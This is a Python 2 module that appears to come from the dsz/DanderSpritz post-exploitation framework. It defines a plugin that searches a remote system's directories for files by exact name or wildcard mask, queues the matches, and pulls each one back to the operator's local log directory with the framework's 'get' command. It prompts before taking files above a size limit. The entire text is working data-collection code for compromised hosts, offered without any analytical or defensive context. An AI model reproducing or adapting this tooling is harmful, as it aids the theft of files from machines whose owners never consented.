
import dsz.ui
import ops.system.systemversion
import ops.cmd
import ops.files.gets
import os
import re

class plugin(object, ):

    def __init__(self, os, maxsize, modName):
        self.__os = os
        self.__MAXSIZE = maxsize
        self.__loadedModule = modName
        self.__users = []
        self.__FILES = []
        self.__collectedFiles = []

    def printFiles(self):
        for f in self.__FILES:
            print f.fullpath

    def listFiles(self):
        return self.__FILES

    def listCollectedFiles(self):
        return self.__collectedFiles

    def getOS(self):
        return self.__os

    def getMaxSize(self):
        return self.__MAXSIZE

    def setMaxSize(self, size):
        self.__MAXSIZE = size

    def add(self, fileitem):
        if (fileitem not in self.__FILES):
            self.__FILES.append(fileitem)

    def find(self, path, files=[], needUserDirs=True):
        try:
            dirs = ops.files.dirs.get_dirlisting(path, recursive=needUserDirs)
            for diritem in dirs.diritem:
                for fileitem in diritem.fileitem:
                    if (fileitem.name in files):
                        self.add(fileitem)
                    else:
                        for f in files:
                            if (f.count('*') > 0):
                                pattern = f.replace('*', '(.*)')
                                regex = re.match(pattern, fileitem.name)
                                if (regex != None):
                                    self.add(fileitem)
                                else:
                                    pass
        except Exception as e:
            pass

    def findPathAndMask(self, pathAndMask=[], needUserDirs=False):
        try:
            for path in pathAndMask:
                rDir = os.path.split(path)[0]
                rFile = os.path.split(path)[1]
                dirs = ops.files.dirs.get_dirlisting(rDir, recursive=needUserDirs)
                for diritem in dirs.diritem:
                    for fileitem in diritem.fileitem:
                        if (fileitem.name == rFile):
                            self.add(fileitem)
                        elif (rFile.count('*') > 0):
                            pattern = rFile.replace('*', '(.*)')
                            regex = re.match(pattern, fileitem.name)
                            if (regex != None):
                                self.add(fileitem)
                            else:
                                pass
        except Exception as e:
            pass

    def get(self):
        while (len(self.__FILES) > 0):
            f = self.__FILES.pop()
            if (f.size > self.__MAXSIZE):
                prompt = dsz.ui.Prompt(('Size of %s is %d, do you still want to get it? (Yes/[No]/Quit)' % (f.fullpath, f.size)), False)
                if (prompt == False):
                    print ('  skipped %s, TOO LARGE' % f.fullpath)
                else:
                    self.__collectedFiles.append(self.reallyget(f))
            else:
                self.__collectedFiles.append(self.reallyget(f))

    def reallyget(self, f):
        cmd = ops.cmd.getDszCommand('get')
        cmd.arglist = [('"%s"' % f.fullpath)]
        print (('[' + self.__loadedModule) + ('] get %s (%d bytes)' % (f.fullpath, f.size)))
        obj = cmd.execute()
        if cmd.success:
            return [f.fullpath, os.path.join(dsz.lp.GetLogsDirectory(), obj.filelocalname[0].subdir, obj.filelocalname[0].localname)]
        else:
            return None